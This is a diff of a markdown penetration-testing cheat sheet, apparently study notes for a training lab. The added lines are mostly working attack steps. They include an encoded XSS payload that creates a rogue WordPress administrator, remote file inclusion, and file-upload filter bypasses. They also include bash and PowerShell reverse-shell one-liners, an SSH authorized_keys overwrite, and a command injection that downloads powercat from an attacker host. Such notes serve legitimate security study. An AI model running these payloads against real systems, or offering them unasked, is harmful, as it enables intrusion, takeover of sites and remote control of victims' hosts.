@@ -25,7 +25,7 @@
       
 # Penetration testing methodology
 1. Identify in-scope hosts: servers, workstations, network devices
-1. info gathering (passive or active): org infra, assets, personnel
+1. Info gathering (passive or active): org infra, assets, personnel
    - WHOIS: registrar info, domain owner, nameserver, contract emails
      - `whois example.com` `whois 192.168.1.100`
    - DNS: find hostname, subdomains, zone transfer
@@ -96,7 +96,7 @@
      `curl http://<IP>/sitemap.xml`  
    - Vulnerabilities   
      `nikto -h http://<IP>`  
-1. vulnerability detection
+1. Vulnerability detection
    - Identify unpatched services (E.g: SMB, RDP, Apache, MySQL)
    - Check for default/weak credentials
    - automated scanners: nmap --script vuln, nikto, wpscan
@@ -104,14 +104,14 @@
    - tools: nmap, AutoRecon
    - NSE vulnerability script  
      `sudo nmap -sV -p 443 --script "vuln" <target>`  
-1. initial foothold    
+1. Initial foothold    
    - Exploit vulnerable service: SMB, FTP, RDP, SSH
    - web fuzzing: Feroxbuster, WFUF, Burp
    - Web exploitation: SQLi → shell upload, RCE
    - Credential reuse / default creds  
    - tools: nc, curl, wget, hydra, gobuster
    - password cracking: John, Hashcat, Hydra  
-1. privilege escalation
+1. Privilege escalation
    - Linux (LinPEAS)
      - Kernel exploits `searchsploit`
      - SUID/SGID binaries `find / -perm -4000 -type f 2>/dev/null`
@@ -123,11 +123,11 @@
      - Token impersonation (Mimikatz)
      - Cached creds or saved passwords (ntds.dit, SAM/SYSTEM)
      - Enumerate both local & domain privileges
-1. lateral movement
+1. Lateral movement
    - Windows: Pass-the-Hash, Kerberos attacks, RDP, SMB, WMI
    - Linux: SSH key reuse, weak passwords, cron jobs
    - Pivoting via compromised host (ligolo-ng, Impacket, CME, Chisel, proxychains, ssh -L, socat)    
-1. report
+1. Report
    - Scope & methodology
    - Hosts discovered and services.
    - Vulnerabilities and exploitation steps.
@@ -168,23 +168,25 @@
   - Create new user and privilege via XSS (user-agent vulnerable field)  
     1. run this function and get the encoded js
        ```
-       function encode_to_javascript(string) {
-            var input = string
-            var output = '';
-            for(pos = 0; pos < input.length; pos++) {
-                output += input.charCodeAt(pos);
-                if(pos != (input.length - 1)) {
-                    output += ",";
-                }
-            }
-            return output;
-        }
-        
-      let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
-      console.log(encoded)
+         function encode_to_javascript(string) {
+              var input = string
+              var output = '';
+              for(pos = 0; pos < input.length; pos++) {
+                  output += input.charCodeAt(pos);
+                  if(pos != (input.length - 1)) {
+                      output += ",";
+                  }
+              }
+              return output;
+          }
+          
+        let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
+        console.log(encoded)
        ```
-    2. Intercept the burp request and modify the user-agent
+    2. Intercept the burp request GET / and modify the user-agent    
        `<script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>`
+    3. Login to wp-admin/admin.php > Visitors plugin  
+    4. Go to users menu and new user "attacker" created  
   - Embeds a web shell in wordpress plugin and RCE command from url  
     ```
     https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
@@ -195,7 +197,7 @@
     http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag
     ```
 - **Directory traversal**
-  - ⚠️ **Goal: access credentials/store ssh private key by using relative paths**
+  - ⚠️ **Goal: access credentials/store ssh private key by using relative paths**  
     `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
     `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
   - Inspect: url?**page=**xxx
@@ -206,40 +208,96 @@
     ssh -i dt_key -p 2222 offsec@mountaindesserts.com
     ```
 - **Local file inclusion (LFI)**
-  - ⚠️ **Goal: load system files and RCE via log file** 
+  - ⚠️ **Goal: load system files and RCE via log file**   
     `http://target.com/index.php?page=../../../../etc/passwd`
   - Inspect: url?**page=**xxx
-  - Include the log file via LFI
+  - Include the log file via LFI  
     1. Map env (server & log paths)
        **Linux/Apache: /var/log/apache2/access.log or /var/log/httpd/access_log**
        Windows (XAMPP/Apache): C:\xampp\apache\logs\access.log  
-    3. Test log inclusion in header (User-Agent)    
+    3. Test log inclusion in header (User-Agent)      
        `<?php echo system($_GET['cmd']); ?>`
        `http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id`  
-    5. start netcat listener from kali  
+    5. start netcat listener from kali   
        `nc -nvlp 4444`
-    6. URL encoding to bypass bad request error
+    6. URL encoding to bypass bad request error   
        `../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la`
-    7. Include reverse shell
-       `bash -i >& /dev/tcp/<kali>/4444 0>&1` #bash
-       `bash -c "bash -i >& /dev/tcp/<kali>/4444 0>&1"` #bourne shell (sh)
-       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding
-  - PHP wrappers
-    - encode the PHP snippet into base64
+    7. Include 💣 **reverse shell**    
+       `bash -i >& /dev/tcp/<kali>/4444 0>&1` #bash  
+       `bash -c "bash -i >& /dev/tcp/<kali>/4444 0>&1"` #bourne shell (sh)  
+       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding  
+  - PHP wrappers  
+    - encode the PHP snippet into base64  
       `kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64`  
-    - execute system command
+    - execute system command  
       `kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
 NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
-- Remote file inclusion (RFI)
-  - ⚠️ **Goal: load malicious PHP payload from kali**  
-  - Inspect: url?**page=**xxx
-  - dd
-  - dd
-- File upload vulnerabilities
-  - ddd
-  - ddd
-  - ddd
-- Command injection
+- Remote file inclusion (RFI)  
+  - ⚠️ **Goal: load malicious PHP payload from kali**    
+  - Inspect: url?**page=**xxx  
+  - start kali webshells  
+    `kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80`  
+  - exploit RFI  
+    `curl "http://mountaindesserts.com/meteor/index.php?page=http://<kali>/simple-backdoor.php&cmd=ls"`
+- File upload vulnerabilities  
+  - Goal  
+    - ⚠️ **upload and execute web shell/RCE-->revere shell**    
+    - Upload SSH key into ~/.ssh/authorized_keys   
+    - upload malicious xss (stored XSS)  
+  - Inspect: file upload input, request param ?file=upload, API endpoints (upload.php, file_upload)  
+  - Bypass
+    - ❗**filename extensions**: .phps, .php7, .pHP, .php5, .phtml
+    - double extensions: shell.php.jpg, shell.php;.jpg  
+    - MIME manipulation: Content-Type: image/png but payload is PHP
+    - null byte injection: `shell.php%00.jpg`  
+  - 💣 get **reverse shell**  
+    1. start netcat listener from kali  
+       `nc -nvlp 4444`
+    2. Execute webshell command  
+       `curl http://<target>/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
+    3. Use Kali's PowerShell to generate encoded reverse shell one-liner
+       ```
+       kali@kali:~$ pwsh
+     
+       PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+       PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)  
+       PS> $EncodedText =[Convert]::ToBase64String($Bytes)  
+       PS> $EncodedText
+       ...
+       PS> exit
+       ```
+    5. Using curl to send the base64 encoded reverse shell oneliner  
+       ```
+       curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0... AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+       ```
+  - **Overwrite the authorized keys**
+    1. Generate local private keys in kali
+       ```
+       kali@kali:~$ ssh-keygen
+       Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+       cat fileup.pub > authorized_keys
+       ```
+    3. modify the filename (relative path) in burp request  
+       `filename="../../../../../../../root/.ssh/authorized_key"` 
+    4. Connect to SSH  
+       `kali@kali:~$ rm ~/.ssh/known_hosts`  
+       `kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com`  
+- **Command injection**
+  - ⚠️ **execute web shell/RCE-->revere shell**
+  - Inspect: ?page=, ?id=, ?cmd=
+  - detect: (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell    
+    `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>:8000/archive` #send url encoding
+  - 💣 get reverse shell  
+    1. serve Powercat via Python web server  
+       `kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
+    3. start web server  
+       `kali@kali:~$ python3 -m http.server 80`  
+    5. start netcat listener on port 4444  
+       `kali@kali:~$ nc -nvlp 4444`
+    7. Download Powercat and create a reverse shell via command injection
+       `Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell`  > send encoding payload  
+       `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`  
 - SQL injection attacks
   
 # Reverse shell
